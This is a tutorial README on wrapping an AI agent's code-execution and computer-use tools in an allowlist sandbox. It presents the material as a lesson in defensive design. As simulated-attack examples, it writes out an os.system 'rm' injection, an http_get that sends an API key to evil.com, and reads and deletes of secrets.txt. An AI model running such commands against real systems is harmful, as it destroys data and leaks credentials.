# Part 13 - The Code-Running Tool: sandboxed execution and computer-use

> Every tool so far has been a typed JSON function: search this, refund that. That is a narrow keyhole. Real tasks need the agent to WRITE AND RUN CODE (compute something no fixed tool covers) or to ACT ON A SURFACE (read and write files, fetch a page) the way a person would. These two tool classes, code execution and computer-use, are the dominant 2026 agent modality, and the whole series has ignored them. The moment we add them, capability and DANGER arrive together: an agent that can run code can read a secrets file, delete data, or POST your private data to an attacker. The answer is not to forbid code; it is to run it behind a SANDBOX / PERMISSION BOUNDARY built from pieces we already have.

[📖 Read the essay](https://www.mefby.com/essays/code-execution-and-sandbox) · [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/mftnakrsu/agents-by-hand/blob/main/part-13-code-execution-and-sandbox/sandboxed_code_tool.ipynb)

> ⚠️ **WARNING: the toy sandbox in this part is ILLUSTRATIVE, not a real security boundary.** In-process Python "sandboxing" (AST allowlists, stripped builtins) is famously UNSOUND; determined code escapes it. A REAL sandbox is OS-LEVEL isolation: gVisor, Firecracker microVMs, or hardened containers, with the agent's code in a separate kernel-enforced jail. The unsafe "damage" below is SIMULATED (mock dict mutations, printed exfiltration); no untrusted code is ever really executed. Treat this code as a model of the SHAPE of a permission boundary, not as something to put in production.

## What it covers
- **Two new tool classes, and the danger they bring**: every tool from Parts 1 to 12 was a typed JSON function, a narrow keyhole. This part adds CODE EXECUTION (the agent writes and runs code to compute what no fixed tool covers) and COMPUTER-USE (it acts on a surface: read and write files, fetch a page) via structured commands. These are the dominant 2026 modality the series ignored. The catch: the same power that computes an average can read a secrets file, delete data, or exfiltrate it. Capability and danger arrive together.
- **The sandbox / permission boundary, built from parts we already have**: the fix is one boundary made of four pieces. An ACTION ALLOWLIST (for code, an AST allowlist of safe node types and a few safe calls; for commands, an allowlist of `read_file` / `write_file`); a RESOURCE CAP reusing Part 8's `BudgetMeter` to bound how many operations may run; NO-NETWORK ISOLATION (external hosts are denied, so private data cannot be exfiltrated); and IDEMPOTENCY reusing Part 9's keys so a retried write does not double-act.
- **Used legitimately, the new tools just work**: the code tool runs `round(sum(orders) / len(orders), 2)` over `[250.0, 180.0, 90.0]` and returns `173.33`; the computer-use tool runs `read_file({'path': 'report.txt'})` and returns `Q2 refunds summary`. Real compute and real file access, behind the boundary.
- **No boundary: the same power turned against you (damage SIMULATED)**: unsafe code `__import__('os').system('rm report.txt')` -> `[SIMULATED damage] arbitrary code ran; report.txt deleted`; `http_get` to `https://evil.com/x` with body `API_KEY=sk-live-9f3a2b` -> `[SIMULATED exfiltration] sent 'API_KEY=sk-live-9f3a2b' to https://evil.com/x`; `delete_file({'path': 'secrets.txt'})` -> `[SIMULATED damage] deleted secrets.txt`. The filesystem after the unsafe run is `[]`: both files are gone.
- **The sandbox boundary blocks the same attacks while legit work passes**: sandboxed `__import__('os').system('rm report.txt')` -> `BLOCKED: disallowed function call`; `open('secrets.txt').read()` -> `BLOCKED: disallowed function call`; `delete_file` -> `BLOCKED: command 'delete_file' not on the allowlist`; `http_get` -> `BLOCKED: command 'http_get' not on the allowlist`. Meanwhile `write_file({'path': 'out.txt', 'text': 'ok'})` -> `wrote out.txt`, and the retry -> `wrote out.txt (idempotent: already done)`. The filesystem after the sandboxed run is `['out.txt', 'report.txt', 'secrets.txt']`: both protected files intact.
- **The LOUD illustrative-not-real caveat**: in-process Python sandboxing is unsound; this toy is a model of the boundary's SHAPE, not a real jail. Real isolation is OS-level: gVisor, Firecracker microVMs, or hardened containers, kernel-enforced. The "damage" on the unsafe path is SIMULATED; no untrusted code is ever really run.
- **Sets up Part 16**: this boundary is the seed of agentic security. Part 16 turns it into a full pipeline (the lethal trifecta, agentic injection).

## Files
- **`sandboxed_code_tool.py`** — the single runnable script: the world (order amounts, a mock filesystem with a `secrets.txt`, and an empty set of reachable hosts), the AST-allowlist code interpreter (`run_code_sandboxed`) and its unsafe twin (`run_code_unsafe`, which DETECTS dangerous intent and SIMULATES the damage rather than really running it), the computer-use commands (`run_command_sandboxed` / `run_command_unsafe`), the `OpBudget` tiny BudgetMeter (Part 8), the Part 9 idempotency keys for writes, and the three-act demo: the two tool classes used legitimately, the no-boundary run where the same power does (simulated) damage, and the sandboxed run that blocks every attack while legit work passes. The real-LLM and real OS-sandbox backends sit one flag away behind `generate()`.
- **`sandboxed_code_tool.ipynb`** — step-by-step notebook: a markdown why before each small code step, built cell by cell.

## Run it
```bash
# from the repo root; no dependencies, no API key, no network
python3 part-13-code-execution-and-sandbox/sandboxed_code_tool.py   # runs offline
```
Prefer it step by step? Open `sandboxed_code_tool.ipynb` in Jupyter, or click **Open in Colab** above.

## Key idea
Code execution and computer-use unlock real work and real danger at once. The fix is not to forbid code but to wrap it in a PERMISSION BOUNDARY made of pieces from earlier parts: an action allowlist, a resource budget (Part 8), no-network isolation, and idempotent side effects (Part 9). The same dangerous operation that lands with no boundary is blocked by the sandbox, while legitimate work passes:

```
  unsafe code:     "__import__('os').system('rm report.txt')" -> [SIMULATED damage] report.txt deleted
  sandboxed code:  "__import__('os').system('rm report.txt')" -> BLOCKED: disallowed function call
  sandboxed delete: delete_file({'path': 'secrets.txt'})      -> BLOCKED: command 'delete_file' not on the allowlist
  sandboxed write:  write_file({'path': 'out.txt', ...})       -> wrote out.txt
  sandboxed write (retry):                                     -> wrote out.txt (idempotent: already done)
```

The filesystem tells the story: `[]` after the unsafe run (everything gone), `['out.txt', 'report.txt', 'secrets.txt']` after the sandboxed run (both protected files intact, the legit write applied effectively-once). But THIS toy is illustrative: a real sandbox is OS-level (gVisor / Firecracker / containers), and Part 16 turns this boundary into a full agentic-security pipeline.

## Offline by design
The whole demo runs with no network, no API key, and no dependencies. The deterministic default is an AST-allowlist interpreter: the code is parsed, every node is checked against a small allowlist of safe node types and calls, and anything else (imports, attribute access, unknown calls) is rejected before evaluation, so the same output prints every run. The unsafe path NEVER really executes untrusted code; it detects the dangerous intent and SIMULATES the damage (mock dict mutations, printed exfiltration) so the consequence is visible without doing it for real. Set `OPENAI_API_KEY` and a real LLM would write the code/commands, but the demo falls through to the deterministic interpreter for reproducibility. Only `generate()` and a real OS-sandbox backend would need edits to light up the production path behind a real kernel-enforced jail.

---
[Series index](../) · [Part 14 — Supervisor and handoffs: multi-agent systems →](../) (coming soon, frontier track)
